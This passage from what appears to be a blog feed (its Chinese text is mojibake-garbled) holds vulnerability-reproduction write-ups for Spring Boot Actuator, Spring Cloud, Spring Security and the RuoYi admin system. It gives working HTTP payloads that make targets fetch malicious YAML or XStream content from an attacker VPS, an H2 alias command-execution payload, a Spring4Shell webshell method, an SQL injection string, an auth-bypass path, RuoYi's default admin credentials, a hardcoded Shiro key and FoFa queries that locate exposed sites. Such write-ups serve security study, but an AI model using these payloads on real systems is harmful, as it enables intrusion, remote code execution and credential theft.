RCE</strong></p><h5 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ul><li>å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ <code>/env</code> æ¥å£è®¾ç½®å±æ€§</li><li>å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ <code>/refresh</code> æ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨ <code>spring-boot-starter-actuator</code> ä¾èµ–ï¼‰</li><li>ç›®æ ‡ä½¿ç”¨çš„ <code>eureka-client</code> &lt; 1.8.7ï¼ˆé€šå¸¸åŒ…å«åœ¨ <code>spring-cloud-starter-netflix-eureka-client</code> ä¾èµ–ä¸­ï¼‰</li><li>ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„ HTTP æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰</li></ul><h5 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h5><p>ä¿®æ”¹è¦æ‰§è¡Œçš„å‘½ä»¤å</p><p><img src="/../images/image-20230623213306180.png" alt="image-20230623213306180"></p><p>èµ·ä¸€ä¸ªæ¶æ„eureka server </p><p><img src="/../images/image-20230623213230483.png" alt="image-20230623213230483"></p><p>è®¾ç½®eureka.client.serviceUrl.defaultZone å±æ€§ä¸ºæ¶æ„çš„å¤–éƒ¨ eureka server URL åœ°å€</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http:<span class="comment">//your-vps-ip/example</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;http://your-vps-ip/example&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623213048736.png" alt="image-20230623213048736"></p><p>refresh è§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹ URLï¼Œæå‰æ¶è®¾çš„  eureka server å°±ä¼šè¿”å›æ¶æ„çš„ payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line"></span><br><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line"></span><br><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623212943456.png" alt="image-20230623212943456"></p><p>ä»è€Œè§¦å‘ XStream ååºåˆ—åŒ–ï¼Œé€ æˆ RCE æ¼æ´</p><p><img src="/../images/image-20230623212922680.png" alt="image-20230623212922680"></p><p>æ‰§è¡Œå®Œå‘½ä»¤åè®°å¾—æ¢å¤ï¼Œå¦‚æœä¸æ¢å¤çš„è¯ï¼Œé‚£ä¹ˆå‘½ä»¤å°±ä¼šä¸€ç›´æ‰§è¡Œï¼Œç³»ç»Ÿä¹Ÿä¼šä¸€ç›´æŠ¥é”™ï¼Œå°†eureka.client.serviceUrl.defaultZoneå±æ€§è®¾ç½®ä¸ºåŸæ¥çš„å³å¯ã€‚</p></li></ul></li></ul><h4 id="x2F-heapdump"><a href="#x2F-heapdump" class="headerlink" title="&#x2F;heapdump"></a>&#x2F;heapdump</h4><blockquote><p>Heap Dumpä¹Ÿå«å †è½¬å‚¨æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªJavaè¿›ç¨‹åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„å†…å­˜å¿«ç…§<br>Heap Dumpæ˜¯æœ‰ç€å¤šç§ç±»å‹çš„ï¼Œä¸è¿‡æ€»ä½“ä¸Šheap dumpåœ¨è§¦å‘å¿«ç…§çš„æ—¶å€™éƒ½ä¿å­˜äº†javaå¯¹è±¡å’Œç±»çš„ä¿¡æ¯<br>é€šå¸¸åœ¨å†™heap dumpæ–‡ä»¶å‰ä¼šè§¦å‘ä¸€æ¬¡FullGCï¼Œæ‰€ä»¥heap dumpæ–‡ä»¶ä¸­ä¿å­˜çš„æ˜¯FullGCåç•™ä¸‹çš„å¯¹è±¡ä¿¡æ¯ã€‚å…¶ä¸­å¯èƒ½ä¼šå«æœ‰æ•æ„Ÿæ•°æ®ï¼Œå¦‚æ•°æ®åº“çš„å¯†ç æ˜æ–‡,accesskeyç­‰</p></blockquote><p>è®¿é—®åä¼šä¸‹è½½heapdump</p><p><img src="/../images/image-20230623215844567.png" alt="image-20230623215844567"></p><h5 id="heapdumpåˆ†æå·¥å…·"><a href="#heapdumpåˆ†æå·¥å…·" class="headerlink" title="heapdumpåˆ†æå·¥å…·"></a>heapdumpåˆ†æå·¥å…·</h5><ul><li><p>JAVAè‡ªå¸¦å·¥å…·</p><p>binç›®å½•ä¸‹çš„jhatå’Œjvisualvm</p><ul><li><p>jhat</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jhat -J-mx512M .\heapdump</span><br></pre></td></tr></table></figure><p>è®¿é—®æœ¬åœ°7000ç«¯å£ï¼Œé€šè¿‡å…³é”®è¯æœç´¢</p><p><img src="/../images/image-20230622152038148.png"></p></li><li><p>jvisualvm</p></li></ul></li><li><p><a href="https://github.com/whwlsfb/JDumpSpider">JDumpSpider</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622152614844.png" alt="image-20230622152614844"></p><p><img src="/../images/image-20230622152600035.png" alt="image-20230622152600035"></p></li></ul><h2 id="cloud-SnakeYAML-RCE"><a href="#cloud-SnakeYAML-RCE" class="headerlink" title="cloud SnakeYAML RCE"></a>cloud SnakeYAML RCE</h2><h3 id="ç‰ˆæœ¬å½±å“"><a href="#ç‰ˆæœ¬å½±å“" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>ç›®æ ‡ä¾èµ–çš„ <code>spring-cloud-starter</code> ç‰ˆæœ¬ &lt; 1.3.0</p><h3 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>æœ¬åœ°ç”Ÿæˆyaml-payloadçš„jaråŒ…,å‘½ä»¤ä¸º</p><p><img src="/../images/image-20230623221559474.png" alt="image-20230623221559474"></p><p>ç”Ÿæˆåˆ©ç”¨è¯¥jaråŒ…çš„example.ymlæ–‡ä»¶</p><p><img src="/../images/image-20230623221123809.png" alt="image-20230623221123809"></p><p>æŒ‚è½½æœåŠ¡</p><p><img src="/../images/image-20230623221249623.png" alt="image-20230623221249623"></p><p>è®¾ç½®spring.cloud.bootstrap.location å±æ€§ä¸ºå¤–éƒ¨æ¶æ„ yml æ–‡ä»¶ URL åœ°å€</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http:<span class="comment">//your-vps-ip/example.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;eureka.client.serviceUrl.defaultZone&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;http://your-vps-ip/example.yml&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220715323.png" alt="image-20230623220715323"></p><p>refresh è§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸Šçš„ yml æ–‡ä»¶ï¼Œè·å¾—å…¶å†…å®¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># spring 1.x</span></span><br><span class="line"></span><br><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># spring 2.x</span></span><br><span class="line"></span><br><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623220901991.png" alt="image-20230623220901991"></p><p>SnakeYAML ç”±äºå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€ä»¥è§£ææ¶æ„ yml å†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œ,å…ˆæ˜¯è§¦å‘ java.net.URL å»æ‹‰å–è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸Šçš„æ¶æ„ jar æ–‡ä»¶,ç„¶åæ˜¯å¯»æ‰¾ jar æ–‡ä»¶ä¸­å®ç° javax.script.ScriptEngineFactory æ¥å£çš„ç±»å¹¶å®ä¾‹åŒ–,å®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€ æˆ RCE æ¼æ´</p><p><img src="/../images/image-20230623220853189.png" alt="image-20230623220853189"></p><h3 id="æ³¨å…¥å†…å­˜é©¬"><a href="#æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="æ³¨å…¥å†…å­˜é©¬"></a>æ³¨å…¥å†…å­˜é©¬</h3><p><img src="/../images/image-20230623222557267.png" alt="image-20230623222557267"></p><h2 id="restart-h2-database-query-RCE"><a href="#restart-h2-database-query-RCE" class="headerlink" title="restart h2 database query RCE"></a>restart h2 database query RCE</h2><h3 id="ç‰ˆæœ¬å½±å“-1"><a href="#ç‰ˆæœ¬å½±å“-1" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>å­˜åœ¨ <code>com.h2database.h2</code> ä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰</p><h3 id="å¤ç°-2"><a href="#å¤ç°-2" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>hackbaréœ€è¦å°†åŸæœ¬çš„content-typeåˆ é™¤ï¼Œç„¶åé€‰æ‹©application&#x2F;jsonæ‰å¯ä»¥å‘é€Content-Type: application&#x2F;jsonçš„è¯·æ±‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;spring.datasource.hikari.connection-test-query&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233147055.png" alt="image-20230623233147055"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230623233543854.png" alt="image-20230623233543854"></p><p><img src="/../images/image-20230623233529452.png" alt="image-20230623233529452"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯payload ä¸­çš„ â€˜T5â€™ æ–¹æ³•æ¯ä¸€æ¬¡æ‰§è¡Œå‘½ä»¤åéƒ½éœ€è¦æ›´æ¢åç§° (å¦‚ T6) ï¼Œç„¶åæ‰èƒ½è¢«é‡æ–°åˆ›å»ºä½¿ç”¨ï¼Œå¦åˆ™ä¸‹æ¬¡ restart é‡å¯åº”ç”¨æ—¶æ¼æ´ä¸ä¼šè¢«è§¦å‘</p><p><img src="/../images/image-20230623233701077.png" alt="image-20230623233701077"></p><h2 id="Cloud-Gateway-SPEL-RCE"><a href="#Cloud-Gateway-SPEL-RCE" class="headerlink" title="Cloud Gateway SPEL RCE"></a>Cloud Gateway SPEL RCE</h2><p>Spring Cloud Gatewayæ˜¯Springä¸­çš„ä¸€ä¸ªAPIç½‘å…³ã€‚å­˜åœ¨SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œ<strong>å½“æ”»å‡»è€…å¯ä»¥è®¿é—®Actuator APIçš„æƒ…å†µä¸‹</strong>ï¼Œå°†å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="ç‰ˆæœ¬å½±å“-2"><a href="#ç‰ˆæœ¬å½±å“-2" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><ul><li>Spring Cloud Gateway<ul><li>3.1.0</li><li>3.0.0 to 3.0.6</li><li>Older, unsupported versions are also affected</li></ul></li></ul><h3 id="å¤ç°-3"><a href="#å¤ç°-3" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ·»åŠ ä¸€ä¸ªåŒ…å«æ¶æ„SpELè¡¨è¾¾å¼çš„è·¯ç”±/actuator/gateway/routes/hacktest</span><br><span class="line">åº”ç”¨åˆšæ·»åŠ çš„è·¯ç”±/actuator/gateway/refresh</span><br><span class="line">è®¿é—®æ¶æ„è·¯ç”±å¾—åˆ°ç»“æœ/actuator/gateway/routes/hacktest</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622121048903.png" alt="image-20230622121048903"></p><p><img src="/../images/image-20230622121110774.png" alt="image-20230622121110774"></p><h2 id="Cloud-Function-SPEL-RCE"><a href="#Cloud-Function-SPEL-RCE" class="headerlink" title="Cloud Function  SPEL RCE"></a>Cloud Function  SPEL RCE</h2><p>Spring Cloud Function æ˜¯Spring cloudä¸­çš„serverlessæ¡†æ¶ã€‚</p><p>Spring Cloud Function ä¸­çš„ RoutingFunction ç±»çš„ apply æ–¹æ³•å°†è¯·æ±‚å¤´ä¸­çš„â€œspring.cloud.function.routing-expressionâ€å‚æ•°ä½œä¸º Spel è¡¨è¾¾å¼è¿›è¡Œå¤„ç†ï¼Œé€ æˆ Spel è¡¨è¾¾å¼æ³¨å…¥æ¼æ´ã€‚</p><p>æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="ç‰ˆæœ¬å½±å“-3"><a href="#ç‰ˆæœ¬å½±å“-3" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>org.springframework.cloud:spring-cloud-function-contextï¼ˆå½±å“ç‰ˆæœ¬ï¼š3.0.0.RELEASE~3.2.2ï¼‰</p><h3 id="å¤ç°-4"><a href="#å¤ç°-4" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>acceptéœ€è¦ä¿®æ”¹</p><p><img src="/../images/image-20230622130314936.png"></p><p><img src="/../images/image-20230622130328296.png" alt="image-20230622130328296"></p><h2 id="spring-core-rce"><a href="#spring-core-rce" class="headerlink" title="spring-core-rce"></a>spring-core-rce</h2><h3 id="ç‰ˆæœ¬å½±å“-4"><a href="#ç‰ˆæœ¬å½±å“-4" class="headerlink" title="ç‰ˆæœ¬å½±å“"></a>ç‰ˆæœ¬å½±å“</h3><p>ä½¿ç”¨JDK9åŠä»¥ä¸Šç‰ˆæœ¬çš„Spring MVCæ¡†æ¶<br>spring-webmvc æˆ– spring-webfluxä¾èµ–<br>spring framework 5.3.0-5.3.17ã€5.2.0-5.2.19ç‰ˆæœ¬ï¼Œä»¥åŠæ›´æ—©çš„ç‰ˆæœ¬</p><h3 id="å¤ç°-5"><a href="#å¤ç°-5" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è¿™é‡Œç¯å¢ƒç”¨vulfocusçš„ï¼Œvulhubçš„ä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/spring-core-rce-2022-03-29</span><br><span class="line">docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>æ”»å‡»åŸç†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡ä¿®æ”¹Tomcatçš„æ—¥å¿—è·¯å¾„ä¸åç¼€å†™å…¥jspæœ¨é©¬</span><br></pre></td></tr></table></figure><p>è„šæœ¬ï¼š<a href="https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE">https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE</a></p><p><img src="/../images/image-20230622144319219.png" alt="image-20230622144319219"></p><p><img src="/../images/image-20230622144248672.png" alt="image-20230622144248672"></p><p><img src="/../images/image-20230622143115129.png" alt="image-20230622143115129"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯æ¯æ¬¡å‘webhsellè¯·æ±‚æ—¶éƒ½ä¼šå†æ¬¡å‘å…¶å†™å…¥æœ¨é©¬å†…å®¹</p><p><img src="/../images/image-20230622143518694.png" alt="image-20230622143518694"></p><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹è¯·æ±‚è¿›è¡Œæ¸…é™¤</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span><br></pre></td></tr></table></figure><p>æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ–¹æ³•ä¼šä¿®æ”¹ç›®æ ‡æœåŠ¡å™¨é…ç½®ï¼Œå¯¼è‡´ç›®æ ‡éœ€è¦é‡å¯æœåŠ¡å™¨æ‰èƒ½æ¢å¤ï¼Œå®é™…æµ‹è¯•ä¸­éœ€è¦æ ¼å¤–æ³¨æ„ã€‚</p><h2 id="ç»•è¿‡æˆæƒè®¿é—®admin"><a href="#ç»•è¿‡æˆæƒè®¿é—®admin" class="headerlink" title="ç»•è¿‡æˆæƒè®¿é—®admin"></a>ç»•è¿‡æˆæƒè®¿é—®admin</h2><blockquote><p>åœ¨Spring Securityä¸­ä½¿ç”¨RegexRequestMatcherä¸”è§„åˆ™ä¸­åŒ…å«å¸¦ç‚¹å·çš„æ­£åˆ™è¡¨è¾¾å¼æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„æ•°æ®åŒ…ç»•è¿‡èº«ä»½è®¤è¯</p></blockquote><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><blockquote><p>Spring Security 5.5.x &lt; 5.5.7<br>Spring Security 5.6.x &lt; 5.6.4</p></blockquote><h3 id="å¤ç°-6"><a href="#å¤ç°-6" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p><img src="/../images/image-20230622145009253.png" alt="image-20230622145009253"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/%0a</span><br><span class="line">/admin/%0d</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622145034999.png" alt="image-20230622145034999"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è‹¥ä¾æ¼æ´</title>
      <link href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="è‹¥ä¾"><a href="#è‹¥ä¾" class="headerlink" title="è‹¥ä¾"></a>è‹¥ä¾</h2><p><a href="http://ruoyi.vip/">http://ruoyi.vip/</a></p><p>åŸºäº<strong>SpringBoot</strong>çš„æƒé™ç®¡ç†ç³»ç»Ÿ æ˜“è¯»æ˜“æ‡‚ã€ç•Œé¢ç®€æ´ç¾è§‚ã€‚ æ ¸å¿ƒæŠ€æœ¯é‡‡ç”¨<strong>Springã€MyBatisã€Shiro</strong>æ²¡æœ‰ä»»ä½•å…¶å®ƒé‡åº¦ä¾èµ–ã€‚</p><blockquote><p>è‹¥ä¾çš„ä½œè€…å°†Spring Securityæ›¿æ¢ä¸ºshiro</p></blockquote><h2 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a>FoFa</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;-1231872293&quot;</span><br><span class="line">body=&quot;è‹¥ä¾&quot; 68,137 æ¡åŒ¹é…ç»“æœ</span><br><span class="line">body=&quot;è‹¥ä¾åå°ç®¡ç†æ¡†æ¶&quot;   19,575 æ¡åŒ¹é…ç»“æœ</span><br><span class="line">js_name=&quot;/ruoyi/login.js&quot;   2,918 æ¡åŒ¹é…ç»“æœ</span><br></pre></td></tr></table></figure><p>è¯•äº†å‡ ä¸ªï¼Œè›®å¤šé»˜è®¤å¯†ç çš„</p><p><img src="/../images/image-20230622103533741.png" alt="image-20230622103533741"></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç‰ˆæœ¬é€‰æ‹©V4.6.1</p><p>IDEAè¿æ¥æ•°æ®åº“</p><p><img src="/../images/image-20230621190329600.png" alt="image-20230621190329600"></p><p>å‰©ä¸‹æ­¥éª¤</p><p>ä¿®æ”¹é…ç½®æ–‡ä»¶<code>RuoYi-Vue/ruoyi-admin/src/main/resources/logback.xml</code>ä¸­çš„æ•°æ®åº“è´¦å·å’Œå¯†ç </p><p><a href="https://juejin.cn/post/7081625556705345573">RuoYiæ­å»ºå¼€å‘ç¯å¢ƒ - æ˜é‡‘</a></p><h2 id="åå°Sqlæ³¨å…¥"><a href="#åå°Sqlæ³¨å…¥" class="headerlink" title="åå°Sqlæ³¨å…¥"></a>åå°Sqlæ³¨å…¥</h2><h3 id="ç‰ˆæœ¬"><a href="#ç‰ˆæœ¬" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h3><p>RuoYi &lt;&#x3D; v4.6.1</p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>åˆ†æ<a href="https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql">https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># POST</span><br><span class="line"></span><br><span class="line">/system/role/list</span><br><span class="line"></span><br><span class="line">params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230621195248659.png" alt="image-20230621195248659"></p><h2 id="åå°å®šæ—¶ä»»åŠ¡"><a href="#åå°å®šæ—¶ä»»åŠ¡" class="headerlink" title="åå°å®šæ—¶ä»»åŠ¡"></a>åå°å®šæ—¶ä»»åŠ¡</h2><h3 id="ç‰ˆæœ¬-1"><a href="#ç‰ˆæœ¬-1" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h3><p>RuoYi &lt;&#x3D; v4.6.2</p><h3 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>é»˜è®¤å¯†ç ä¸ºadmin&#x2F;admin123</p><p>è¿›å…¥åå°ç³»ç»Ÿç›‘æ§ä¸‹çš„å®šæ—¶ä»»åŠ¡åŠŸèƒ½ï¼Œå¯ä»¥å‘ç°è°ƒç”¨ç›®æ ‡å­—ç¬¦ä¸²çš„å­—æ®µã€‚</p><p><img src="/../images/image-20230621192434476.png" alt="image-20230621192434476"></p><p>è¿™é‡Œå­˜åœ¨yamlååºåˆ—åŒ–æ¼æ´ï¼Œåˆ†æ<a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></p><h4 id="ç”Ÿæˆyamlæ¶æ„jaråŒ…"><a href="#ç”Ÿæˆyamlæ¶æ„jaråŒ…" class="headerlink" title="ç”Ÿæˆyamlæ¶æ„jaråŒ…"></a>ç”Ÿæˆyamlæ¶æ„jaråŒ…</h4><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>ä¿®æ”¹é¡¹ç›®æºç æ–‡ä»¶ src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java </p><p><img src="/../images/image-20230621210916844.png" alt="image-20230621210916844"></p><p>åœ¨ideaä¸­æ‰“å¼€ç»ˆç«¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰“åŒ…ä¸ºjaråŒ…</span></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¼€å¯httpæœåŠ¡</span></span><br><span class="line">python -m http.server 1234</span><br></pre></td></tr></table></figure><h4 id="åˆ›å»ºå®šæ—¶ä»»åŠ¡"><a href="#åˆ›å»ºå®šæ—¶ä»»åŠ¡" class="headerlink" title="åˆ›å»ºå®šæ—¶ä»»åŠ¡"></a>åˆ›å»ºå®šæ—¶ä»»åŠ¡</h4><p>å·¥å…·<a href="https://github.com/thelostworldFree/Ruoyi-All">https://github.com/thelostworldFree/Ruoyi-All</a></p><p><img src="/../images/image-20230621210655817.png" alt="image-20230621210655817"></p><p>å¼€å¯å®šæ—¶ä»»åŠ¡</p><p><img src="/../images/image-20230621210752535.png" alt="image-20230621210752535"></p><h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><p><img src="/../images/image-20230621210823778.png" alt="image-20230621210823778"></p><p><img src="/../images/image-20230621210844522.png" alt="image-20230621210844522"></p><h2 id="shiroååºåˆ—åŒ–"><a href="#shiroååºåˆ—åŒ–" class="headerlink" title="shiroååºåˆ—åŒ–"></a>shiroååºåˆ—åŒ–</h2><p>å‰é¢æåˆ°äº†è‹¥ä¾çš„æ ¸å¿ƒæŠ€æœ¯é‡‡ç”¨<strong>Shiro</strong>ï¼Œå¦‚æœå¯†é’¥æ³„éœ²äº†ï¼Œè‡ªç„¶å°±å­˜åœ¨shiroååºåˆ—åŒ–æ¼æ´ã€‚</p><p>é»˜è®¤æ˜¯åŠ¨æ€ç”Ÿæˆå¯†é’¥ï¼Œå›ºå®šå¯†é’¥å¯ä»¥åœ¨<code>application.yml</code>ä¸­é…ç½®<code>shiro.cookie.cipherKey</code></p><p><img src="/../images/image-20230621193653154.png" alt="image-20230621193653154"></p><p>V4.3.1~V4.6.1ï¼ŒcipherKeyä½¿ç”¨ç¡¬ç¼–ç zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D;</p><p><img src="/../images/image-20230621203731261.png" alt="image-20230621203731261"></p><h3 id="å¤ç°-2"><a href="#å¤ç°-2" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>æ³¨æ„ï¼šShiroåœ¨1.4.2ç‰ˆæœ¬å¼€å§‹ï¼Œç”±AES-CBCåŠ å¯†æ¨¡å¼æ”¹ä¸ºäº†AES-GCMã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨åšæ¼æ´éªŒè¯æ—¶ï¼Œè¦å°†payloadæ”¹æˆAES-GCMåŠ å¯†æ¨¡å¼ã€‚ï¼ˆshiroç‰ˆæœ¬åœ¨pom.xmlä¸­çš„ä¾èµ–æŸ¥çœ‹ï¼‰</p><p><img src="/../images/image-20230621202753098.png" alt="image-20230621202753098"></p><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p><a href="https://xz.aliyun.com/t/11928#toc-4">ã€ä»£ç å®¡è®¡ã€‘è‹¥ä¾åå°ç®¡ç†ç³»ç»Ÿ - å…ˆçŸ¥ç¤¾åŒº</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å®ä¹ é¢è¯•</title>
      <link href="/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/"/>
      <url>/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/</url>
      
